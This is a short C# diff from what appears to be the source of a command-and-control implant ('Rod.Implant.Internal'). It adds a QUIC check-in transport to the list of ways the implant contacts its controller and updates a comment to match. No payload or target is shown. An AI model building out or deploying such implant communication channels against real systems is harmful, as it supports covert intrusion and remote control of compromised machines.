@@ -3,7 +3,7 @@
 //   materializes the per-build transport selection into the staging copy,
 //   naming only the check-in modules whose source files the bake compiled in
 //   (architecture.md Sec 8) and dropping the others whole. This checked-in
-//   default names all three modules so the implant compiles and runs on its
+//   default names all four modules so the implant compiles and runs on its
 //   own (dev runs) against any URL shape and either mode.
 // </auto-generated>
 namespace Rod.Implant.Internal;
@@ -15,5 +15,6 @@ internal static class TransportSelection
         WebCheckIn.Create(setup),
         WsCheckIn.Create(setup),
         StreamCheckIn.Create(setup),
+        QuicCheckIn.Create(setup),
     ];
 }
